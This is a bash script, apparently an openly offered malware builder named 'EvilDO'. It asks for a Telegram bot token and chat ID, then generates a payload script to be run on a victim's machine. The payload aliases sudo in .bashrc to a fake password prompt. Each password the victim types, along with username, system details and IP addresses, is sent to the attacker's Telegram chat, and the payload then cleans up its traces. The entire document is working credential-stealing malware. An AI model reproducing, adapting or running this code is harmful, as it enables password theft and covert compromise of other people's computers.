#!/bin/bash
INPUT_SYM=$(echo -e "\e[31m>\e[0m")
##FUNCS
function F_setup_generate {
cat <<MAINEOF > evildo.sh
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=New target connected.
Uname: \$(uname -a)

Public IP: \$( curl -s https://ipinfo.io/ip & 2> /dev/null )
" &> /dev/null &
echo '
#!/bin/bash

##FUNCS
function F_coverup {
for i in \$(cat \$HOME/.bashrc | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | cut -c 1-1); do
OUT_CLEAN=\$(cat -n "\$HOME/.bashrc" | grep -E "(alias sudo=.chmod .x|# Making sudo config for current user)" | head -n 1 | grep -Eo [0-9]+)
sed -i "\${OUT_CLEAN}d" \$HOME/.bashrc
done


rm "\$HOME/.bash_info" & disown
' > \$HOME/.bash_info
echo '
}
##FUNCS

if ! ping -c 1 8.8.8.8 &> /dev/null ; then 
/bin/sudo \$*
exit
fi
read -se -p "[sudo] password for \$(whoami): " pass
pass="\${pass//+/(plus_symbol)}"
IP=\$( curl -s https://ipinfo.io/ip & 2> /dev/null )
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass

User: \$(whoami)

Uname: \$(uname -a)

Local IP and interfaces: \$(ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: \$IP
" &> /dev/null &
sleep 3
echo "Sorry, try again."
read -se -p "[sudo] password for \$(whoami): " pass
pass="\${pass//+/(plus_symbol)}"
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass

User: \$(whoami)

Uname: \$(uname -a)

Local IP and interfaces: \$( ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: \$IP
" &> /dev/null &
F_coverup &
sleep 3
echo "Sorry, try again."
read -se -p "[sudo] password for \$(whoami): " pass
pass="\${pass//+/(plus_symbol)}"
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Password: \$pass

User: \$(whoami)

Uname: \$(uname -a)

Local IP and interfaces: \$( ip a | grep -E \(^[1-9]\|inet\ \) )

Public IP: \$IP
" &> /dev/null &
sleep 3
echo "sudo: 3 incorrect password attempts"


exec bash
' >> \$HOME/.bash_info

echo "# Making sudo config for current user" >> "\$HOME/.bashrc"
echo "alias sudo='chmod +x \$HOME/.bash_info; bash \$HOME/.bash_info'" >> "\$HOME/.bashrc"
if [ -f "\$(realpath "\$0")" ]; then 
rm -f "\$(realpath "\$0")" &> /dev/null & disown
fi
exec bash
MAINEOF
}
function F_setup {
echo " 
At first, register your Telegram bot with BotFather, that's how we gonna interact with victim's PC. You need HTTP API token and chat ID
"
while true; do
read -p "Do you know how it's done?(y/n) $INPUT_SYM " QN_BOT_HELP
case $QN_BOT_HELP in
y|Y)
break
;;
n|N) 
echo "Follow the guide mentioned in README"
;;
*)
echo "Unrecognised option"
;;
esac
done
while true; do
read -p "Good! Then type your HTTP API token here $INPUT_SYM " QN_API_REQ
if [ -n "$QN_API_REQ" ]; then 
break
else
echo "It's null"
fi
done

while true; do
read -p "Thanks! Aaand, one more thing, your chat ID $INPUT_SYM " QN_ID_REQ
if [ -n "$QN_ID_REQ" ]; then 
break
else
echo "It's null"
fi
done
echo "Pinging your bot..."
curl -X POST "https://api.telegram.org/bot$QN_API_REQ/sendMessage" -d "chat_id=$QN_ID_REQ&text=Hey! 
It's EvilDO test message. 
All passwords and stuff will be here, in this chat! 
Happy hacking!
" &> /dev/null
echo -e '\e[32mGreat! I have sent you a test message! Check for it \e[0m'
echo -e '\e[1;33mWarning: if you have not recived any messages, I suggest you to check data you wrote or refer to README file. \e[0m'

echo -e "\e[32mGenerating evildo.sh...\e[0m"
if [ -f "evildo.sh" ]; then 
while true; do 
read -p "'evildo.sh' already exists, do you want to overwrite it?(y/n) $INPUT_SYM " QN_MAIN_EXISTS
case "$QN_MAIN_EXISTS" in 
y|Y)
break
;;
n|N)
echo "Ok. Good luck!"
exit 0
;;
*)
echo "Unrecognised option"
;;
esac
done
fi
F_setup_generate
chmod +x evildo.sh
echo -e "\e[32mGeneration completed! Run 'evildo.sh' on the target device to infect it. 

Have a great day! \e[0m"

}
##FUNCS
echo -e '\e[31m


▓█████ ██▒   █▓ ██▓ ██▓    ▓█████▄  ▒█████
▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▀ ██▌▒██▒  ██▒
▒███   ▓██  █▒░▒██▒▒██░    ░██   █▌▒██░  ██▒
▒▓█  ▄  ▒██ █░░░██░▒██░    ░▓█▄   ▌▒██   ██░
░▒████▒  ▒▀█░  ░██░░██████▒░▒████▓ ░ ████▓▒░
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░ ▒▒▓  ▒ ░ ▒░▒░▒░
 ░ ░  ░  ░ ░░   ▒ ░░ ░ ▒  ░ ░ ▒  ▒   ░ ▒ ▒░
   ░       ░░   ▒ ░  ░ ░    ░ ░  ░ ░ ░ ░ ▒
   ░  ░     ░   ░      ░  ░   ░        ░ ░
           ░                ░
			
\e[0m
'
echo -e "[\e[31m1\e[0m] Setup EvilDO
[\e[31m0\e[0m] Quit
"
while true; do 
read -p "Welcome here! Choose option $INPUT_SYM " QN_OPTION
case $QN_OPTION in 
1)
F_setup
break
;;
0)
echo "Ok. Good luck!"
exit 0
;;
*)
echo "Unrecognised option"
esac
done

